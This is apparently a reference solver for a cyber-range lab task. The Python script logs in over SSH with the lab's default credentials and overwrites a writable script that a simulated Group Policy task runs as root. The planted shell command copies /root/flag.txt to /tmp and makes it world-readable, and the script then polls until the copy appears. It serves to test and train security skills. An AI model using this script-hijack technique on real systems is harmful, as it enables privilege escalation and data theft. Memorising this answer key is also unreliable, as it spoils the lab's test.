"""Intended-path solver: hijack the GPO-defined script through the writable folder."""

import time
import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

DROP_SCRIPT = (
    "printf '%s\\n' '#!/bin/sh' 'cp /root/flag.txt /tmp/flag'"
    " 'chmod 644 /tmp/flag' > /srv/gpo-scripts/cache-refresh.sh"
)
CHECK_GPO = "grep -l Command /srv/sysvol-sim/Policies/*/Machine/Preferences/Tasks/*.xml"
READ_FLAG = "cat /tmp/flag 2>/dev/null"
POLL_SECONDS = 75
POLL_INTERVAL = 5


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        _, stdout, _ = client.exec_command(CHECK_GPO, timeout=10)
        gpo_files = stdout.read().decode(errors="replace")
        if "tasks.xml" not in gpo_files:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="hijack-the-policy-task",
                        ok=False,
                        captured=None,
                        detail=f"GPO task definitions not found: {gpo_files[:200]}",
                    )
                ]
            )

        _, stdout, stderr = client.exec_command(DROP_SCRIPT, timeout=15)
        code = stdout.channel.recv_exit_status()
        err = stderr.read().decode(errors="replace")
        if code != 0:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="hijack-the-policy-task",
                        ok=False,
                        captured=None,
                        detail=f"could not rewrite cache-refresh.sh (rc={code}): {err[:200]}",
                    )
                ]
            )

        deadline = time.monotonic() + POLL_SECONDS
        captured = None
        out = ""
        while time.monotonic() < deadline:
            _, stdout, _ = client.exec_command(READ_FLAG, timeout=10)
            out = stdout.read().decode(errors="replace")
            flags = find_flags(out)
            if flags:
                captured = flags[0]
                break
            time.sleep(POLL_INTERVAL)
    finally:
        client.close()

    return SolveResult(
        results=[
            TaskResult(
                task_id="hijack-the-policy-task",
                ok=bool(captured),
                captured=captured,
                detail=None
                if captured
                else f"policy loop did not deliver /tmp/flag in {POLL_SECONDS}s: {out[:200]}",
            )
        ]
    )
